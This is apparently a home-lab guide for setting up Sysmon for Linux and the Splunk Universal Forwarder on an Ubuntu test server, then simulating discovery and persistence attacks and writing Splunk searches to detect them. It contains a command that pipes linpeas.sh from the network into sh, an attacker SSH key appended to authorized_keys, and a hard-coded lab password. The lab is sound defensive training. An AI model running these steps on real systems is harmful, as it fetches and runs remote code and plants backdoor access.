# Ubuntu Server
Prepare a Ubuntu Server system (I spun up another VM running Ubuntu 24.04 LTS), as we practice configuring things and then work on some common use cases.

We will be using the Splunk "agent" called the Universal Forwarder (UF)
- harvests local logs and forward them to the Splunk indexer running on the server
- configure UF to pick up more logs so we can practice looking for cyber attacks

NOTE You will need your splunk.com account again to download Splunk plugins and the UF installer

## Configuring Splunk Server
We already configured the server plugins in the previous Ubuntu Desktop step.

## Configure Ubuntu Server
Set up a Ubuntu Server 24.04 LTS test machine. Give it 20GB or more space in the root partition. Usually this mean editing the default 10GB root partition. Enable ssh access to make it easier to configure.

Be default the UFW firewall is disabled/inactive. If you enabled it, you will need to allow TCP/9997.
- `sudo ufw allow 9997/tcp`
- `sudo ufw status`

### Sysmon for Linux
1.  Register the Microsoft repository key
    - `curl -sSL https://packages.microsoft.com/keys/microsoft.asc | sudo gpg --dearmor -o /usr/share/keyrings/microsoft-archive-keyring.gpg`
    - `echo "deb [arch=amd64,arm64,armhf signed-by=/usr/share/keyrings/microsoft-archive-keyring.gpg] https://packages.microsoft.com/ubuntu/24.04/prod noble main" | sudo tee /etc/apt/sources.list.d/microsoft-prod.list`
2. Update and Install
    - `sudo apt update && sudo apt install sysmonforlinux -y`
3. Create file [sysmon-config.xml](sysmon-config.xml)
4. Configure
    - `sudo sysmon -accepteula -i sysmon-config.xml`
5. `systemctl status sysmon`

### Install UF for Unix
1. Download the .deb file
    - https://splunk.com/en_us/download/universal-forwarder.html
    - You need to log in to splunk.com
    - Linux tab > 64-bit ( 6.x+ kernel, etc.) **.deb**
    - Copy the wget link and paste into a command line
2. Install the package named similar to `splunkforwarder-10.0.2-xxxxxx-linux-amd64.deb`
    - `sudo dpkg -i splunkforwarder-10.0.2-xxxxxx-linux-amd64.deb`
    - `sudo /opt/splunkforwarder/bin/splunk start --accept-license`
        - Create `admin`/`Splunklab123!` credential, used later for UF changes
    - `sudo /opt/splunkforwarder/bin/splunk stop`
    - `sudo /opt/splunkforwarder/bin/splunk enable boot-start`
    - `sudo /opt/splunkforwarder/bin/splunk stop`
3. Connect Splunk indexer
    - `sudo /opt/splunkforwarder/bin/splunk add forward-server <YOUR_SPLUNK_IP>:9997`
        - enter the `admin`/`Splunklab123!` credentials when prompted
    - `sudo /opt/splunkforwarder/bin/splunk list forward-server`
4. Configure what logs to collect
    - Start with authentication logs and system logs
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/auth.log`
        - `sudo /opt/splunkforwarder/bin/splunk add monitor /var/log/syslog`
    -  Add Sysmon logs
        - `sudo vi /opt/splunkforwarder/etc/system/local/inputs.conf`
            - New file
                - `[journald://sysmon]`
                - `index = main`
                - `sourcetype = sysmon:linux`
    - ` sudo /opt/splunkforwarder/bin/splunk restart`
5. Confirming logs arrive
    - Create test logs on the Ubuntu desktop:
      - `logger hello splunk`
      - `sudo echo "hello splunk"`
    - Log in to the Splunk Web UI
    - `| metadata type=hosts`
      - If your Ubuntu host name shows up, it is working!
    - `index=_internal host=<ubuntu-hostname>` (usually all lowercase in Splunk)
    - `index=main (sourcetype="syslog" OR sourcetype="auth")`
    - `index=main sourcetype="auth"`
    - `index=main sourcetype="sysmon:linux"`
~~~
index=main sourcetype="auth"
| table _time, host, source, _raw
| sort - _time
~~~

~~~
index=main sourcetype="sysmon:linux"
| table _time, host, User, Image, EventID, _raw
| sort - _time
~~~

EventID 1=Process creation, 11=File create, 3=Network connection. (5=process terminated)

## Test "Discovery" Scenario
Discovery scripts often use binaries that a normal server shouldn't be running frequently (e.g., lscpu, arp, lsmod)

1. Run the command
    - `curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh`
2. Look at "Rare Binaries"
~~~
index=main sourcetype="sysmon:linux" EventID=1
| stats count, earliest(_time) as first_time, latest(_time) as last_time by Image, host
| eventstats avg(count) as avg_use, stdev(count) as dev_use
| where count < (avg_use / 2) OR count == 1
| table host, Image, count
~~~

~~~
index=main sourcetype="sysmon:linux" EventID=1
| stats count, earliest(_time) as first_time, latest(_time) as last_time, values(ParentImage) as Parent by Image, host
| eventstats avg(count) as avg_use
| where count < (avg_use / 2) OR count == 1
| eval first_time=strftime(first_time, "%H:%M:%S"), last_time=strftime(last_time, "%H:%M:%S")
| table host, Parent, Image, count, first_time
| sort + count
~~~

Challenge: Based on the results of the Rare Binaries table, write a Splunk Alert that triggers if more than 10 'Rare' discovery binaries are executed by the same parent process within a 60-second window.

## Test "Persistence" Scenario
Attackers love modifying ~/.ssh/authorized_keys because it allows them to log back in as a specific user without needing a password, bypassing many traditional authentication logs.

- Simulate the attacker
  - `mkdir -p ~/.ssh`
  - `echo "ssh-rsa AAAAB3Nza1yc2EAAAADAQABAAABgQC6... attacker@evildomain.com" >> ~/.ssh/authorized_keys`
  - `chmod 600 ~/.ssh/authorized_keys`
- Splunk search
~~~
index=main sourcetype="sysmon:linux" EventID=11
| search TargetFilename="*/.ssh/authorized_keys*"
| table _time, host, user, Image, TargetFilename, ProcessId
| sort - _time
~~~

~~~
index=main sourcetype="sysmon:linux" EventID=11
| table _time, user, Image, TargetFilename
~~~

Find modifications to sudoers, shadow file, etc.
~~~
index=main sourcetype="sysmon:linux" EventID=11 
| search TargetFilename IN ("/etc/shadow", "/etc/sudoers*", "/etc/passwd", "/etc/gshadow")
| table _time, host, user, Image, TargetFilename, ProcessId
| sort - _time
~~~

~~~
index=main sourcetype="sysmon:linux" EventID=11
| search TargetFilename IN ("/etc/shadow", "/etc/sudoers*")
| where NOT (Image IN ("/usr/sbin/visudo", "/usr/sbin/usermod", "/usr/bin/passwd", "/usr/sbin/useradd"))
| stats count values(Image) as modifying_tool by host, TargetFilename, user
~~~
